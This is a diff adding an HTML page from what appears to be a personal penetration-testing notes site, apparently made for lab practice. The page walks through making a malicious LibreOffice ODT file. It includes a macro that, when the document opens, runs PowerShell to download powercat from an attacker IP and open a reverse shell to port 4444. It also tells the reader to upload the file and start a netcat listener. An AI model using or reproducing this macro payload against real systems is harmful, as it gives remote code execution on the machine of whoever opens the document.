@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/miscStyles.css">
+    <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>LibreOffice</h1>
+            <p>A free and open-source office suite that includes applications for word processing, spreadsheets, presentations, and more</p>
+        </div>
+        <div class="notion-body">
+            <h2>Malicious ODT File</h2>
+            <ul>
+             <p>In some cases you might be able to upload an ODT file in any website. In that case we could insert malicious macro code into the document in order to achieve a reverse shell connection</p>
+             <p>First create a document with LibreOffice. Then</p>
+             <p>Go to <b>Tools > Macros > Organize Macros > Basic...</b></p>
+             <p>Then select the document and click on <b>New</b></p>
+             <img style="border: 1px solid; width: 30%; height: 30%;" src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_3_238Qwmfa.png">
+             <p>Setup the name you want and insert the following code:</p>
+             <p>Before setting up the macro, we can perform a quick test just to check if everything is working</p>
+             <pre><code class="language-powershell">Shell("cmd /c powershell iwr 192.168.118.14")</code></pre>
+             <p>Now setup the code in order to download powercat and stablish a reverse shell connection</p>
+             <pre><code class="language-powershell">Sub Main
+    Shell("cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.172:8000/powercat.ps1'); powercat -c 192.168.45.172 -p 4444 -e powershell")
+End Sub</code></pre>
+             <p>Finally save the macro by using clicking the top menu icon</p>
+             <p>Now create a trigger for the macro. Go to <b>Tools > Customize...</b> select <b>Events</b> and then select <b>Open Document</b> then select <b>Macro</b></p>
+             <img style="border: 1px solid; width: 30%; height: 30%;" src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_5_G6ptMddD.png">
+             <p>Now select the macro you just created</p>
+             <img style="border: 1px solid; width: 30%; height: 30%;" src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_6_HLfEiWq9.png">
+             <p>Finally save and close the document, upload it and setup a nc listener and a python server hosting the powercat .ps1 script</p>
+            </ul>
+            
+        </div>
+    </div>
+
+
+</body>
+
+<script>
+    const botones = document.querySelectorAll(".button");
+
+    botones.forEach(boton => {
+    boton.addEventListener("click", () => {
+        const contenido = boton.nextElementSibling;
+        contenido.style.display =
+        contenido.style.display === "block" ? "none" : "block";
+    });
+    });
+</script>
+</html>
